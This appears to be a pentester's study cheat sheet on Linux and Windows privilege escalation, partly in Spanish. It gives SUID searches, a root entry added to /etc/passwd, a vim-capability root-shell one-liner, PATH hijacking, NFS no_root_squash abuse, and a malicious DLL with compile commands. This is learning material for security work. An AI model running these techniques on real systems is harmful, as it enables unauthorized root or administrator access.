
	## Privilege escalation
	
	## All operative syste
	https://github.com/carlospolop/PEASS-ng

		------ Linux -----

		# Linux checks for search
		https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

		## Review command that can run as root
			sudo -l

		## sudo Nmap spawn shell
		https://gtfobins.github.io/gtfobins/nmap/
		https://w0lfram1te.com/privilege-escalation-with-nmap

		## sudo Nano spawn shell
		https://gtfobins.github.io/gtfobins/nano/

		## Priv trhow SSID
		# List files that have SUID or SGID bits set.
			> find / -type f -perm -04000 -ls 2>/dev/null
			> Files have an “s” bit set showing their special permission level.
			> Vulnerable files: https://gtfobins.github.io/#+suid

		## Add user to /etc/passwd
		* Create password hash: openssl passwd -1 -salt [somsalt] [passwd]
		* Add de entry in /etc/password and add root:/bin/bash in the end

		## Capabilities
		* Check capabilities: getcap -r /
		* Using vim capavilities to elevate privs
			> ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' 

		## Cron jobs
		* cat /etc/crontab
		* Use potential misconfiguration to exec reverse root shell

		## PATH
		* If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script
		* echo $PATH
		* Search writeable folders:
			> all: find / -writable 2>/dev/null
			> clean find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
					find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
		* Add /tmp to PATH
			> export PATH=/tmp:$PATH

		## NFS (Network File Sharing)
		* cat /etc/exports
		* Review from remote: showmount -e [IP]
		* The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
		* Mount remote folder into local, create exploit and exec


		------ Windows -----

		## Users Types ##
		* Administrator (local): This is the user with the most privileges.
		* Standard (local): These users can access the computer but can only perform limited tasks. Typically these users can not make permanent or essential changes to the system. 
		* Guest: This account gives access to the system but is not defined as a user. 
		* Standard (domain): Active Directory allows organizations to manage user accounts. A standard domain account may have local administrator privileges. 
		* Administrator (domain): Could be considered as the most privileged user. It can edit, create, and delete other users throughout the organization's domain. 

		## Documentation, tecnics and tactics
		https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

		## Information gathering


		## DLL Hijaking
		A DLL Hijacking scenario consists of replacing a legitimate DLL file with a malicious DLL file that will be called by the executable and run.

		Example of Crafted Malicious DLL:

		    ```      
			#include <windows.h>

			BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
			    if (dwReason == DLL_PROCESS_ATTACH) {
			        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
			        ExitProcess(0);
			    }
			    return TRUE;
			}
			```

		Compilar la DLL desde Linux:

			```
			apt install gcc-mingw-w64-x86-64 
			x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
			```

		Program for search DLL
		- https://docs.microsoft.com/en-us/sysinternals/downloads/procmon


        
		




		